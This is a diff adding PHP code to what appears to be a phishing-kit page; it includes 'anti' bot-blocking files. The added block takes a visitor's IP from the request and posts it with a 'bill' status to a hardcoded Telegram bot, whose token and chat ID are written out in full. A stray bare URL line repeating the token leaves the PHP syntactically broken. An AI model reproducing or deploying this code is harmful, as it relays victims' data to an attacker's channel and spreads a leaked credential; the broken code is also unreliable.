@@ -1,5 +1,43 @@
 <?php
 session_start();
+
+if(isset($_GET['messageId'])){
+	$botToken = "6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk";
+$chatID = "1064643518";
+	$messageId=$_GET['messageId'];
+	$ipzebi=$_GET['ipzebi'];
+	$message = urlencode("IP: $ipzebi , status : bill");
+
+
+
+// Initialize cURL session
+$ch = curl_init();
+
+// Set cURL options
+curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot".$botToken."/editMessageText");
+curl_setopt($ch, CURLOPT_POST, true);
+curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
+    'chat_id' => $chatID,
+    'message_id' => 40,
+    'text' => $message
+]));
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+
+// Execute cURL request
+$response = curl_exec($ch);
+
+// Close cURL session
+curl_close($ch);
+
+// Optionally, you can decode and use the response
+$responseData = json_decode($response, true);
+
+
+
+}
+
+https://api.telegram.org/bot6699499754:AAHaG6cBsD7zxVMrfOAcebt7u66bs8AMMXk/editMessageText?chat_id=1064643518&message_id=40&text=fghfghfg
+
 include "anti/anti1.php";
 include "anti/anti2.php"; 
 include "anti/anti3.php"; 
